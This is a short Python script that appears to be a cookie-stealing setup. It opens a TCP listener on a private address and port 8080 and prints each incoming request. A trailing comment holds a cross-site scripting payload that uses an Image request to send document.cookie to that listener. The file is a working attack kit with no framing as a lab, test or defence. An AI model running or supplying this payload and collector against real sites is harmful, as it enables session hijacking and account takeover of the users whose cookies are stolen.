import socket

host = '192.168.1.4'
port = 8080

tcp_server = socket.socket(
    socket.AF_INET,
    socket.SOCK_STREAM
)

tcp_server.bind((host, port))
tcp_server.listen(1)

while True:
    c, addr = tcp_server.accept()
    received = c.recv(1024) # bytes
    print(received)
    c.close()

tcp_server.close()

# <script> new Image().src="192.168.1.4:8080/?="+document.cookie</script>